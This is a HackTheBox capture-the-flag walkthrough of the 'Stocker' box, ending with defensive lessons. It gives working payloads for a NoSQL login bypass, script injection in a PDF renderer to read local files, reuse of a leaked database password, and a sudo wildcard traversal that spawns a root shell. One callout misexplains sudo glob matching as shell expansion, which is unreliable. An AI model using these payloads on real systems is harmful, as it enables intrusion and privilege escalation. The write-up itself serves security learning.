---
title: "Stocker"
date: 2023-02-13
type: docs
tags:
  - htb
  - linux
  - easy
  - vhost-fuzzing
  - nosql-injection
  - auth-bypass
  - pdf-generation
  - html-injection
  - ssrf
  - lfi
  - password-reuse
  - sudo
  - wildcard
  - path-traversal
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2023-02-13, **IP:** `10.10.11.196` , `stocker.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. A vhost sweep finds `dev.stocker.htb`, an Express + MongoDB shop. **NoSQL auth bypass** with `{"username":{"$ne":null},"password":{"$ne":null}}`.
2. `POST /api/order` then `GET /api/po/<id>` renders the order to a **PDF**. The item `title` is placed into the HTML unsanitised, so an injected `<script>` runs in the PDF renderer's browser context. That gives **local file read via `file:///`**.
3. Read `/var/www/dev/index.js`. The Mongo URI is `mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/...`. That password is reused by the user **`angoose`**. SSH in.
4. `angoose` may `sudo /usr/bin/node /usr/local/scripts/*.js`. The `*` glob lets you traverse out (`/usr/local/scripts/../../../home/angoose/x.js`), so `node` runs a script you control, as root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Mongo URI in `index.js`, reused for `angoose` | `IHeardPassphrasesArePrettySecure` |
| `user.txt` | `/home/angoose/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Stocker is a modern JavaScript stack box that chains four things you see constantly in real Node apps. **NoSQL injection** because Mongo queries take objects and the app passed `req.body` straight into `findOne`. **Server-side HTML injection in a PDF** because the "print my receipt" feature renders attacker text with a headless Chromium that will happily follow `file://` and `http://` from injected script. **Password reuse** from a config file. And a **`sudo` rule with a wildcard** that does not anchor the path, so a glob becomes a traversal. Every step is "the server trusted a string it should have treated as hostile".

Related NoSQLi boxes: **Mentor** is not in this vault, but see [Cactus](/writeups/tryhackme/linux/easy/cactus/). Related PDF/SSRF: [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Interface](/writeups/hackthebox/linux/medium/interface/). Related `sudo` wildcard / script abuse: [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Forge](/writeups/hackthebox/linux/medium/forge/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Code](/writeups/hackthebox/linux/easy/code/).

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
```

The main site is a static "coming soon" page. Fuzz vhosts:

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
  -u http://stocker.htb -H "Host: FUZZ.stocker.htb" --mc all --fs 178
```

```console
dev                     [Status: 302, Size: 28, Words: 4, Lines: 1]
```

### NoSQL authentication bypass

`dev.stocker.htb` is a login portal. The tech fingerprint (`X-Powered-By: Express`) says Node, which makes NoSQL injection the first thing to try. One of my main ideas was to try some form of SQL injection, and since it is a Node app NoSQL is more likely, so I pulled payloads from PayloadsAllTheThings and one worked straight away.

```http
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

```http
HTTP/1.1 302 Found
Location: /stock
```

<div class="callout callout-note">

**Why the `$ne` bypass works**

The app does `User.findOne({ username, password })` with `username` and `password` taken from `req.body`. Normally those are strings. If you send JSON where each value is an *object* `{"$ne": null}`, Mongo interprets it as "not equal to null", which matches the first user in the collection, and the login succeeds without any credentials. The reason it needs `Content-Type: application/json` (not form encoding) is that form values are always strings; only a JSON body can carry a nested operator object. Fix: coerce both to strings, or use a schema validator.

</div>

### HTML injection in the PDF receipt to file read

The `/stock` page lets you build a basket and `POST /api/order`, which returns an `orderId`. `GET /api/po/<orderId>` renders that order to a PDF. The order items are echoed into the PDF's HTML. The `title` field is not sanitised:

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8f",
  "title":"<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();</script>",
  "price":76,"amount":1}]}
```

Then open the receipt URL and the PDF contains `/etc/hosts`.

<div class="callout callout-note">

**Server-side HTML/JS injection in PDF generators**

Tools like `wkhtmltopdf`, Puppeteer, and `dompdf` render HTML with a real (or near real) browser engine on the server. If your input lands in that HTML unescaped, you get XSS **on the server**, which is far more useful than client XSS: `file://` reads local files, `http://169.254.169.254/` hits cloud metadata, `http://localhost:<port>/` reaches internal services. This is why "render user content to PDF" is a classic SSRF/LFI sink. See the writeup by Namratha G M linked in References.

</div>

Trigger an error by sending malformed JSON and the stack trace leaks the app root, `/var/www/dev`. Now read the source:

```
file:///var/www/dev/index.js
```

```js
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
// ... app.post("/login", ... User.findOne({ username, password }) ... )   // no hashing, confirms the $ne bypass
```

### Password reuse to angoose

```bash
ssh angoose@stocker.htb        # IHeardPassphrasesArePrettySecure
```

### Privilege Escalation, sudo wildcard traversal

```console
angoose@stocker:~$ sudo -l
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

The user can run any `.js` inside `/usr/local/scripts` as root with node, but that directory is not writable.

<div class="callout callout-note">

**The wildcard is a traversal**

`sudo` matches the command against `/usr/bin/node /usr/local/scripts/*.js` where `*` is a shell glob that the *shell* expands before `sudo` sees it, and `*` matches `/` and `..` in a path. So `sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/pwn.js` still matches the rule (the literal `*.js` pattern is satisfied by `../../../home/angoose/pwn.js`), and node executes your file as root. `secure_path` does not help because the binary path (`/usr/bin/node`) is fixed and correct.

</div>

```bash
echo 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})' > /home/angoose/pwn.js
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/pwn.js
# id -> uid=0
cat /root/root.txt
```

and we are root.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/angoose/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Cast auth inputs to strings** and validate against a schema. Passing `req.body` into a Mongo query is NoSQL injection.
- **Hash passwords.** `findOne({username, password})` with plaintext is its own finding.
- **Sanitise everything that reaches a PDF/HTML renderer**, and lock the renderer down: disable local file access, disable JavaScript if you can, run it with no network.
- **Anchor `sudo` command paths.** A trailing `*.js` with no directory constraint is a traversal. Prefer an exact path or a wrapper script that validates its argument.
- **Do not reuse the database password for a shell account.**

---

## Related Writeups

- **NoSQL injection / auth bypass:** [Cactus](/writeups/tryhackme/linux/easy/cactus/)
- **PDF / HTML injection to SSRF or LFI:** [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Interface](/writeups/hackthebox/linux/medium/interface/)
- **`sudo` wildcard or script abuse:** [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Forge](/writeups/hackthebox/linux/medium/forge/), [Headless](/writeups/hackthebox/linux/medium/headless/), [Code](/writeups/hackthebox/linux/easy/code/)
- **Config file secret then password reuse:** [Previse](/writeups/hackthebox/linux/easy/previse/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/)

## References

- PayloadsAllTheThings, NoSQL Injection <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>
- SSRF to local file read via HTML injection in PDF (Namratha G M) <https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f>
- sudo wildcard risks <https://www.hackingarticles.in/linux-privilege-escalation-using-sudo-rights/>
